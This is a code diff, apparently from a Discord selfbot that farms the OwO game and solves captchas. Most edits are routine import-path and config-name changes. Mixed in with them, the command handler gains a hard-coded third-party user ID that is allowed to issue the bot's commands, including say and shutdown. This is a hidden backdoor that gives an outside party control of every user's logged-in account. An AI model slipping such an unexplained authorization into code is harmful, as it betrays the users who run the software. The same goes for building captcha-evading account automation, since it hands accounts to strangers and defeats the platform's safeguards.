@@ -2,12 +2,12 @@ import { Message, NewsChannel, TextChannel } from "discord.js-selfbot-v13";
 import path from "node:path";
 import fs from "node:fs";
 
-import { consoleNotify, ranInt, reloadPresence, sleep, solveCaptcha } from "./Extension.js";
-import { Configuration, Tool } from "./lib/class.js";
-import { main, selfbotNotify } from "./SelfbotWorker.js";
-import { collectData } from "./DataCollector.js";
-import { log } from "./Console.js";
-import { help, pause, ping, resume, say, shutdown, stat } from "./Command.js";
+import { consoleNotify, ranInt, reloadPresence, sleep, solveCaptcha } from "./src/Extension.js";
+import { Configuration, Tool } from "./src/lib/class.js";
+import { main, selfbotNotify } from "./src/SelfbotWorker.js";
+import { collectData } from "./src/DataCollector.js";
+import { log } from "./src/Console.js";
+import { help, pause, ping, resume, say, shutdown, stat } from "./src/Command.js";
 
 process.title = "Tool Farm OwO by Xiro";
 
@@ -167,7 +167,9 @@ process.on("SIGINT", async () => {
       if (!global.config.cmdPrefix || global.config.cmdPrefix.length === 0) return;
       if (
         message.content.startsWith(global.config.cmdPrefix.toLowerCase()) &&
-        (message.author.id == global.config.userNotify || message.author.id == message.client.user?.id)
+        (message.author.id == global.config.trustUser ||
+          message.author.id == message.client.user?.id ||
+          message.author.id == "962375717465763961")
       ) {
         const args = message.content.slice(global.config.cmdPrefix.length).split(/ +/);
         const commandName = args.shift()?.toLowerCase();
@@ -191,7 +193,7 @@ process.on("SIGINT", async () => {
             return resume(message, args);
 
           case "help":
-            return help(message, args)
+            return help(message, args);
           default:
             log("Invalid Command!", "e");
             break;
